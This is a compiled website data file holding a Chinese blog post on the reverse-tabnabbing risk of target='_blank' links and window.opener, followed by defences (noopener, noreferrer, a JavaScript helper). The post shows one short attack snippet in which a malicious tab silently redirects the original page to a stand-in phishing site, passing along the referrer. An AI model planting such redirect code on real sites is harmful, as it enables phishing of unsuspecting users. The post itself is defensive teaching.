webpackJsonp([0xdd414e1373f7],{579:function(n,a){n.exports={data:{site:{siteMetadata:{title:"KnownsecFED",author:"304 Team",siteUrl:"https://knownsec-fed.com"}},markdownRemark:{id:"/Users/zhaozhiming/projects/work/knownsec/KnownsecFED/src/pages/2018-03-01-wei-xian-de-targetblank-yu-opener/index.md absPath of file >>> MarkdownRemark",html:'<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/header-b2d5797f97e9d99eadd2357194ee34da-d6978.jpeg"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 1200px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 50%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAKABQDASIAAhEBAxEB/8QAFwAAAwEAAAAAAAAAAAAAAAAAAAMEBf/EABYBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAB1kUMwmLCv//EABsQAAIBBQAAAAAAAAAAAAAAAAECAAMQESEi/9oACAEBAAEFAnUZNNWnEQ7W3//EABURAQEAAAAAAAAAAAAAAAAAABAR/9oACAEDAQE/AYf/xAAXEQEBAQEAAAAAAAAAAAAAAAABABES/9oACAECAQE/ATG5L//EABoQAAEFAQAAAAAAAAAAAAAAAAEAAhAikTL/2gAIAQEABj8CFBio1cnYMf/EABkQAQADAQEAAAAAAAAAAAAAAAEAESExwf/aAAgBAQABPyFhWELXRW9qA/BRnawhgDZVcn//2gAMAwEAAgADAAAAEPzP/8QAFhEAAwAAAAAAAAAAAAAAAAAAAAER/9oACAEDAQE/EHDKf//EABcRAAMBAAAAAAAAAAAAAAAAAAABEWH/2gAIAQIBAT8QhrRij//EAB0QAAICAwADAAAAAAAAAAAAAAERACExQWFxkaH/2gAIAQEAAT8QYN1Zbd3qo6xTIssH4a7BL9w15iKUEaJh/OOAolAAHJ//2Q==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px white;"\n        alt="危险的 target="_blank" 与 “opener”"\n        title=""\n        src="/static/header-b2d5797f97e9d99eadd2357194ee34da-d6978.jpeg"\n        srcset="/static/header-b2d5797f97e9d99eadd2357194ee34da-527f0.jpeg 300w,\n/static/header-b2d5797f97e9d99eadd2357194ee34da-9a7cd.jpeg 600w,\n/static/header-b2d5797f97e9d99eadd2357194ee34da-d6978.jpeg 1200w"\n        sizes="(max-width: 1200px) 100vw, 1200px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<blockquote>\n<p>在网页中使用链接时，如果想要让浏览器自动在新的标签页打开指定的地址，通常的做法就是在 <code>a</code> 标签上添加 <code>target等于"_blank"</code> 属性。</p>\n<p>然而，就是这个属性，为钓鱼攻击者带来了可乘之机。</p>\n</blockquote>\n<h1>起源</h1>\n<h2><code>parent</code> 与 <code>opener</code></h2>\n<p>在说 <code>opener</code> 之前，可以先聊聊 <code>&#x3C;iframe></code> 中的 <code>parent</code>。</p>\n<p>我们知道，在 <code>&#x3C;iframe></code> 中提供了一个用于父子页面交互的对象，叫做 <code>window.parent</code>，我们可以通过 <code>window.parent</code> 对象来从框架中的页面访问父级页面的 <code>window</code>。</p>\n<p><code>opener</code> 与 <code>parent</code> 一样，只不过是用于 <code>&#x3C;a target="_blank"></code> 在新标签页打开的页面的。通过 <code>&#x3C;a target="_blank"></code> 打开的页面，可以直接使用 <code>window.opener</code> 来访问来源页面的 <code>window</code> 对象。</p>\n<h2>同域与跨域</h2>\n<p>浏览器提供了完整的跨域保护，在域名相同时，<code>parent</code> 对象和 <code>opener</code> 对象实际上就直接是上一级的 <code>window</code> 对象；而当域名不同时，<code>parent</code> 和 <code>opener</code> 则是经过包装的一个 <code>global</code> 对象。这个 <code>global</code> 对象仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 <code>DOMException</code>）。</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/same-b0119f9d1839c8a2a30132fac8ccfed1-67abc.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 729px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 5.761316872427984%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsSAAALEgHS3X78AAAAOElEQVQI1zWKyQ2AQAzEaIfcoYH0X5VhkfKyx5rL3YkIMpOZobs5bbmuqpgZVfW3s+XOj/t5EBFe0P0e0WR93swAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px white;"\n        alt="同域"\n        title=""\n        src="/static/same-b0119f9d1839c8a2a30132fac8ccfed1-67abc.png"\n        srcset="/static/same-b0119f9d1839c8a2a30132fac8ccfed1-942e0.png 300w,\n/static/same-b0119f9d1839c8a2a30132fac8ccfed1-08b62.png 600w,\n/static/same-b0119f9d1839c8a2a30132fac8ccfed1-67abc.png 729w"\n        sizes="(max-width: 729px) 100vw, 729px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    \n\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/cross-c634dd4e086fcbb57b8fca08e8075337-67abc.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 729px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 5.761316872427984%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsSAAALEgHS3X78AAAANklEQVQI1z2IxwEAIAgDXQepLsD+W0XDw9eV5e6ICGQmunvIV1Uws++qOk3nY2/JR3/NfyAiuMzTHrheFbgtAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px white;"\n        alt="跨域"\n        title=""\n        src="/static/cross-c634dd4e086fcbb57b8fca08e8075337-67abc.png"\n        srcset="/static/cross-c634dd4e086fcbb57b8fca08e8075337-942e0.png 300w,\n/static/cross-c634dd4e086fcbb57b8fca08e8075337-08b62.png 600w,\n/static/cross-c634dd4e086fcbb57b8fca08e8075337-67abc.png 729w"\n        sizes="(max-width: 729px) 100vw, 729px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>在 <code>&#x3C;iframe></code> 中，提供了一个 <code>sandbox</code> 属性用于控制框架中的页面的权限，因此即使是同域，也可以控制 <code>&#x3C;iframe></code> 的安全性。</p>\n<h1>利用</h1>\n<p>如果，你的网站上有一个链接，使用了 <code>target="_blank"</code>，那么一旦用户点击这个链接并进入一个新的标签，新标签中的页面如果存在恶意代码，就可以将你的网站直接导航到一个虚假网站。此时，如果用户回到你的标签页，看到的就是被替换过的页面了。</p>\n<h2>详细步骤</h2>\n<ol>\n<li>\n<p>在你的网站 <code>https://example.com</code> 上存在一个链接：</p>\n<div class="gatsby-highlight">\n      <pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://an.evil.site<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>进入一个“邪恶”的网站<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>\n</code></pre>\n      </div>\n</li>\n<li>\n<p>用户点击了这个链接，在新的标签页打开了这个网站。这个网站可以通过 HTTP Header 中的 <code>Referer</code> 属性来判断用户的来源。</p>\n<p>并且，这个网站上包含着类似于这样的 JavaScript 代码：</p>\n<div class="gatsby-highlight">\n      <pre class="language-javascript"><code><span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token string">\'{{header.referer}}\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\nwindow<span class="token punctuation">.</span>opener<span class="token punctuation">.</span>location<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">\'https://a.fake.site/?\'</span> <span class="token operator">+</span> url<span class="token punctuation">)</span><span class="token punctuation">;</span>\n</code></pre>\n      </div>\n</li>\n<li>\n<p>此时，用户在继续浏览这个新的标签页，而原来的网站所在的标签页此时已经被导航到了 <code>https://a.fake.site/?https%3A%2F%2Fexample.com%2F</code>。</p>\n</li>\n<li>\n<p>恶意网站 <code>https://a.fake.site</code> 根据 Query String 来伪造一个足以欺骗用户的页面，并展示出来（期间还可以做一次跳转，使得浏览器的地址栏更具有迷惑性）。</p>\n</li>\n<li>\n<p>用户关闭 <code>https://an.evil.site</code> 的标签页，回到原来的网站………………已经回不去了。</p>\n</li>\n</ol>\n<blockquote>\n<p>上面的攻击步骤是在跨域的情况下的，在跨域情况下，<code>opener</code> 对象和 <code>parent</code> 一样，是受到限制的，仅提供非常有限的属性访问，并且在这仅有的几个属性中，大部分也都是不允许访问的（访问会直接抛出 <code>DOMException</code>）。</p>\n<p>但是与 <code>parent</code> 不同的是，<strong>在跨域的情况下，<code>opener</code> 仍然可以调用 <code>location.replace</code> 方法</strong>而 <code>parent</code> 则不可以。</p>\n<p>如果是在同域的情况下（比如一个网站上的某一个页面被植入了恶意代码），则情况要比上面严重得多。</p>\n</blockquote>\n<h1>防御</h1>\n<p><code>&#x3C;iframe></code> 中有 <code>sandbox</code> 属性，而链接，则可以使用下面的办法：</p>\n<h2>1. Referrer Policy 和 noreferrer</h2>\n<p>上面的攻击步骤中，用到了 HTTP Header 中的 <code>Referer</code> 属性，实际上可以在 HTTP 的响应头中增加 <code>Referrer Policy</code> 头来保证来源隐私安全。</p>\n<p><code>Referrer Policy</code> 需要修改后端代码来实现，而在前端，也可以使用 <code>&#x3C;a></code> 标签的 <code>rel</code> 属性来指定 <code>rel="noreferrer"</code> 来保证来源隐私安全。</p>\n<div class="gatsby-highlight">\n      <pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://an.evil.site<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noreferrer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>进入一个“邪恶”的网站<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>\n</code></pre>\n      </div>\n<blockquote>\n<p>但是要注意的是：即使限制了 <code>referer</code> 的传递，仍然不能阻止原标签被恶意跳转。</p>\n</blockquote>\n<h2>2. noopener</h2>\n<p>为了安全，现代浏览器都支持在 <code>&#x3C;a></code> 标签的 <code>rel</code> 属性中指定 <code>rel="noopener"</code>，这样，在打开的新标签页中，将无法再使用 <code>opener</code> 对象了，它为设置为了 <code>null</code>。</p>\n<div class="gatsby-highlight">\n      <pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://an.evil.site<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noopener<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>进入一个“邪恶”的网站<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>\n</code></pre>\n      </div>\n<h2>3. JavaScript</h2>\n<p><code>noopener</code> 属性看似是解决了所有问题，但是…浏览器的兼容性问题…</p>\n<p>\n  <a\n    class="gatsby-resp-image-link"\n    href="/static/caniuse-93575c220af3d268563890501021a14f-c4b3c.png"\n    style="display: block"\n    target="_blank"\n    rel="noopener"\n  >\n  \n  <span\n    class="gatsby-resp-image-wrapper"\n    style="position: relative; display: block; ; max-width: 1200px; margin-left: auto; margin-right: auto;"\n  >\n    <span\n      class="gatsby-resp-image-background-image"\n      style="padding-bottom: 67.84591194968553%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADHElEQVQ4y32S/U9bZRTH7z+2n32JkWwYN5IpdQNE1mHUTaMZ+BLDVoyGbUAFNrJhZAgi2dYBHULV0gLztrf0vfX2nb7c9t62G5svccnHp2UsMxJ/+OY55+Q5n/M9eR5JS8kUftsiG3eTS21SLwSo5f1P1cjvF4MH6kEphJ71CSnUi2GqpRhSMeUlp3ooJWUacD3rpSIuVTIKRs4noAF2tfCBeliONAfWC/5mXC36kfTAPJo8RUk061qUyk4YQ3VQLWyh57Yx0t7mkHJGDEp5KAsDWlqhkvaI00tJ1CppvzCwZ0IqiFUz6iaxhavcGzyLfOc6uW0HsQsfkfT/TDboJBtzkgg7SYk84XeiBl2kgz+hBn4hqqyJ2hapsJtEyIlkiP2NukpueICvP3yOAfsZ/NZPsQ63Y2ghDLHS/vrGjnC843sm3peyVxeSGtbLepScdZDRwVfpm+1kuet5XneZic8Mo0VclEVTY+UDlf53LukCWDFiZEctjJ5v5ePZLlZ6j9BhMyF3tVL0rIgmMTT5q3gs5Wlj5YmezfeAjUCPULh0gYnPW+mfE8DThzmxaMJjbhMO1wkNnCFjn8Yoh/fg/wdsBPVaAnn+In0Tx/hsppO7vYc5uXgCuecoWtSN710TqZuTAhhpOv0PsLHlPjByqZ/81SHGnBZe2uzE8k0Hy28/AQqHpfA6yvsdJBtA8Xjl/DaltPizGU8TVBJnRfxJLac061Lwk9MEXjjE0Jev0OIzc/6aibVTLZiW2gl0H2v+w+h7HeSXb1CNuKlu2Pldi7NbCFMTjh/mQ5RXf+BBwsujYhRJ7j/F5ouHsFiO0LJ2ks75dsxTbRy9fZyz117j3p0rLPQdZ+WdNmzdL/PdUA93o7f4cXGEjf4e7BtT9I63MuO4zKoyhxR3zOEb+IARazdd9l7MNjNvLHXzpu0tzq2ewzX9FbddkzgXRlhbGmNGnuSGe4xbq1bk6Yt8vz7OrOc6s64JoXGk3WqcxxUVR2yeL5RBvg1dwanexJWwUSsFeFRP8Leu8mctyV/VRPPuY13URPzH/WQz3q819A+t4JpnwGaxKAAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n    >\n      <img\n        class="gatsby-resp-image-image"\n        style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px white;"\n        alt="noopener 的兼容性"\n        title=""\n        src="/static/caniuse-93575c220af3d268563890501021a14f-abe1c.png"\n        srcset="/static/caniuse-93575c220af3d268563890501021a14f-10046.png 300w,\n/static/caniuse-93575c220af3d268563890501021a14f-3c4a3.png 600w,\n/static/caniuse-93575c220af3d268563890501021a14f-abe1c.png 1200w,\n/static/caniuse-93575c220af3d268563890501021a14f-c4b3c.png 1272w"\n        sizes="(max-width: 1200px) 100vw, 1200px"\n      />\n    </span>\n  </span>\n  \n  </a>\n    </p>\n<p>可以看到，现在绝大多数浏览器都已经兼容了 <code>rel="noopener"</code> 属性了。但是，为了保护稍旧的“近代”浏览器或是很旧的“古代”浏览器甚至是“远古”浏览器，只有 <code>noopener</code> 属性还是远远不够的。</p>\n<p>这时，就只能请出下面这段原生 JavaScript 来帮忙了。</p>\n<div class="gatsby-highlight">\n      <pre class="language-javascript 1.8"><code>"use strict";\nfunction openUrl(url) {\n  var newTab = window.open();\n  newTab.opener = null;\n  newTab.location = url;\n}</code></pre>\n      </div>\n<h1>推荐</h1>\n<p>首先，在网站中的链接上，如果使用了 <code>target="_blank"</code>，就要带上 <code>rel="noopener"</code>，并且建议带上 <code>rel="noreferrer"</code>。类似于这样：</p>\n<div class="gatsby-highlight">\n      <pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://an.evil.site<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noopener noreferrer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>进入一个“邪恶”的网站<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>\n</code></pre>\n      </div>\n<p>当然，在跳转到第三方网站的时候，为了 SEO 权重，还建议带上 <code>rel="nofollow"</code>，所以最终类似于这样：</p>\n<div class="gatsby-highlight">\n      <pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://an.evil.site<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>noopener noreferrer nofollow<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>进入一个“邪恶”的网站<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>\n</code></pre>\n      </div>\n<h1>性能</h1>\n<p>最后，再来说说性能问题。</p>\n<p>如果网站使用了 <code>&#x3C;a target="_blank"></code>，那么新打开的标签页的性能将会影响到当前页面。此时如果新打开的页面中执行了一个非常庞大的 JavaScript 脚本，那么原始标签页也会受到影响，会出现卡顿的现象（当然不至于卡死）。</p>\n<p>而如果在链接中加入了 <code>noopener</code>，则此时两个标签页将会互不干扰，使得原页面的性能不会受到新页面的影响。</p>',fields:{slug:"/2018-03-01-wei-xian-de-targetblank-yu-opener/"},frontmatter:{title:'危险的 target="_blank" 与 “opener”',date:"2018-03-01",catalog:"安全",author:"jinliming2"}},allMarkdownRemark:{edges:[{node:{fields:{slug:"/2018-03-19-fan-yi-shi-yong-de-ui-dong-hua-ji-qiao-gai-jin-ui-wei-jiao-hu-de-shi-yong-jian-yi/"},frontmatter:{title:"【翻译】实用的 UI 动画技巧——改进 UI 微交互的实用建议"}}},{node:{fields:{slug:"/2018-03-19-reactref-zhi-bei-jiao-cheng/"},frontmatter:{title:"React ref 指北教程"}}},{node:{fields:{slug:"/2018-03-18-fan-yi-how-to-prevent-your-node.js-process-from-crashing/"},frontmatter:{title:"【翻译】 如何使你的 Node 应用免于崩溃"}}},{node:{fields:{slug:"/2018-03-17-yi-zhong-qian-hou-duan-fen-li-de-kua-yu-kai-fa-fang-shi/"},frontmatter:{title:"一种方便的跨域开发解决方案"}}},{node:{fields:{slug:"/2018-03-13-fan-yi-ru-he-chuang-jian-jiao-hu-you-hao-de-biao-dan/"},frontmatter:{title:"【翻译】如何创建交互友好的表单"}}},{node:{fields:{slug:"/2018-03-12-fan-yi-rang-wo-men-cong-ling-kai-shi-bian-bian-xie-yi-ge-web-fu-wu-qi/"},frontmatter:{title:"【翻译】让我们从零开始变编写一个web服务器"}}},{node:{fields:{slug:"/2018-03-11-bikeshedding/"},frontmatter:{title:"由屎色自行车棚引发的思考"}}},{node:{fields:{slug:"/2018-03-11-xin-shou-shi-jiao-de-docker/"},frontmatter:{title:"新手视角的 Docker"}}},{node:{fields:{slug:"/2018-03-07-fan-yi-ji-yu-cypress-ce-shi-react-ying-yong/"},frontmatter:{title:"【翻译】基于 Cypress 测试 React 应用"}}},{node:{fields:{slug:"/2018-03-05-fan-yi-ru-he-zhao-dao-wan-mei-de-se-cai-da-pei-jie-shao-colorclaim/"},frontmatter:{title:"【翻译】如何找到完美的色彩搭配 - 介绍 ColorClaim"}}},{node:{fields:{slug:"/2018-03-05-ru-he-shi-yong-mac-po-jie-wifi/"},frontmatter:{title:"如何使用Mac破解Wifi"}}},{node:{fields:{slug:"/2018-03-05-yi-ge-chrome-kuo-zhan-jiu-zhe-yang-dan-sheng-liao/"},frontmatter:{title:"程序员偷懒指南 -- 用chrome插件实现前端资讯推送"}}},{node:{fields:{slug:"/2018-03-01-wei-xian-de-targetblank-yu-opener/"},frontmatter:{title:'危险的 target="_blank" 与 “opener”'}}},{node:{fields:{slug:"/2018-02-28-activerecord-he-datamappers-mo-shi-jian-jie/"},frontmatter:{title:"Active Record 和 Data Mappers 模式简介"}}},{node:{fields:{slug:"/2018-02-26-bu-jin-jin-shi-piao-liang-tu-xiang-ru-he-qu-dong-yong-hu-ti-yan/"},frontmatter:{title:"【翻译】不仅仅是漂亮：图像如何驱动用户体验"}}},{node:{fields:{slug:"/2018-02-23-css3-clip-path-yong-fa-jie-shao/"},frontmatter:{title:"CSS3 clip-path 用法介绍"}}},{node:{fields:{slug:"/2018-02-23-du-shu-bi-ji-ke-shi-hua-shi-yi-zhong-yi-shu-bu-zhi-shi-mei-xin-xi-tu-biao-she-ji-yuan-li-yu-jing-dian-an-li-xu-zhang/"},frontmatter:{title:"读书笔记：可视化是一种艺术 -《不只是美：信息图表设计原理与经典案例》序章"}}},{node:{fields:{slug:"/2018-02-23-mei-ge-node-ying-yong-ke-neng-cun-zai-de-timing-attack-an-quan-lou-dong/"},frontmatter:{title:"每个 node 应用可能存在的 timing-attack 安全漏洞"}}},{node:{fields:{slug:"/2018-02-09-zan-lai-liao-liao-vuecompile/"},frontmatter:{title:"咱来聊聊 Vue - compile"}}},{node:{fields:{slug:"/2018-02-05-ji-yi-ci-jian-dan-de-csrf-gong-ji-shi-yan/"},frontmatter:{title:"记一次简单的 CSRF 攻击实验"}}},{node:{fields:{slug:"/2018-02-04-fan-yi-reactscope-jie-shao/"},frontmatter:{title:"【翻译】React Scope介绍"}}},{node:{fields:{slug:"/2018-02-03-fan-yi-liu-ge-xuan-ze-ui-yan-se-de-ji-qiao/"},frontmatter:{title:"【翻译】六个选择UI颜色的技巧"}}},{node:{fields:{slug:"/2018-02-03-huo-yong-git-apply-he-ru-patch-bu-ding/"},frontmatter:{title:"活用 git apply 合入 patch 补丁"}}},{node:{fields:{slug:"/2018-02-03-wo-de-di-yi-ge-node-ming-ling-hang-gong-ju/"},frontmatter:{title:"我的第一个 Node 命令行工具"}}},{node:{fields:{slug:"/2018-02-01-fan-yi-react-xin-de-contextapi/"},frontmatter:{title:"【翻译】React ⚛️  新的 Context API"}}},{node:{fields:{slug:"/2018-01-29-kuai-su-da-jian-ni-de-github-page-ge-ren-bo-ke-ji-yu-createreactapp-de-dan-ye-mian-ying-yong-shi-jian/"},frontmatter:{title:"快速搭建你的 github pages 个人博客 —— 基于 Create-React-App 的单页面应用实践"}}},{node:{fields:{slug:"/2018-01-28-redux-promise-middleware/"},frontmatter:{title:"一个插件让你在 Redux 中写 promise 事半功倍"}}},{node:{fields:{slug:"/2018-01-28-fan-yi-react-zu-jian-mo-shi/"},frontmatter:{title:"【翻译】React 组件设计模式基础"}}},{node:{fields:{slug:"/2018-01-28-fan-yi-bu-yao-rang-yong-hu-zai-chan-pin-ti-yan-shang-shou-dao-cuo-zhe/"},frontmatter:{title:"【翻译】不要让用户在产品体验上受到挫折"}}},{node:{fields:{slug:"/2018-01-27-javascript-mo-huan-dai-li/"},frontmatter:{title:"JavaScript 魔幻代理"}}},{node:{fields:{slug:"/2018-01-22-web-qian-duan-jian-dan-ding-yue-de-shi-xian/"},frontmatter:{title:"Web前端简单订阅的实现"}}},{node:{fields:{slug:"/2018-01-21-how-django-works/"},frontmatter:{title:"从请求到响应 django 都做了哪些处理"}}},{node:{fields:{slug:"/2018-01-21-electron-with-react/"},frontmatter:{title:"React+Electron搭建一个桌面应用"}}},{node:{fields:{slug:"/2018-01-20-fan-yi-ui-she-ji-zhong-de-ge-shi-ta-yuan-ze/"},frontmatter:{title:"【翻译】UI 设计中的格式塔原则"}}},{node:{fields:{slug:"/2018-01-19-xia-yi-dai-tong-xin-xie-yi-quic/"},frontmatter:{title:"下一代通信协议：QUIC"}}},{node:{fields:{slug:"/2018-01-19-fan-yi-shi-yong-css-zhui-zong-yong-hu/"},frontmatter:{title:"【翻译】使用 CSS 追踪用户"}}},{node:{fields:{slug:"/2018-01-14-antd-yuan-ma-jie-du-notification/"},frontmatter:{title:"antd 源码解读 notification"}}},{node:{fields:{slug:"/2018-01-14-ui-zhong-de-pai-ban-chu-xue-zhe-zhi-nan/"},frontmatter:{title:"【翻译】UI 中的排版：初学者指南"}}},{node:{fields:{slug:"/2018-01-14-learn-koa-intro/"},frontmatter:{title:"koa包教包会(一)--白话koa"}}},{node:{fields:{slug:"/2018-01-13-zi-ji-dong-shou-xie-yi-ge-simplevue/"},frontmatter:{title:"自己动手写一个 SimpleVue"}}},{node:{fields:{slug:"/2018-01-12-translation-React-Animations-in-Depth/"},frontmatter:{title:"【翻译】React Web 动画的 5 种创建方式，每一种都不简单"}}},{node:{fields:{slug:"/2018-01-10-ru-he-kuo-zhan-create-react-app-de-webpack-pei-zhi/"},frontmatter:{title:"如何扩展 Create React App 的 Webpack 配置"}}},{node:{fields:{slug:"/2018-01-08-mapbox-gl-js/"},frontmatter:{title:"3D GIS 应用开发 —— 基于 Mapbox GL 的实践总结"}}},{node:{fields:{slug:"/2018-01-07-the-importance-of-visual-appeal-in-web-design/"},frontmatter:{title:"【翻译】视觉吸引力在网页设计中的重要性"}}},{node:{fields:{slug:"/2018-01-06-react-higher-order-component/"},frontmatter:{title:"React 高阶组件介绍"}}},{node:{fields:{slug:"/2018-01-05-to-vim/"},frontmatter:{title:"如何让 vim 成为我们的神器"}}},{node:{fields:{slug:"/2018-01-05-d3-js-v3-data-driven-and-d3-force/"},frontmatter:{title:"D3.js 数据驱动 和 force 力学图讲解"}}},{node:{fields:{slug:"/2018-01-05-create-a-redux-middleware/"},frontmatter:{title:"如何编写一个 Redux 中间件"}}}]}},pathContext:{slug:"/2018-03-01-wei-xian-de-targetblank-yu-opener/"}}}});
//# sourceMappingURL=path---2018-03-01-wei-xian-de-targetblank-yu-opener-4321f17995f675781914.js.map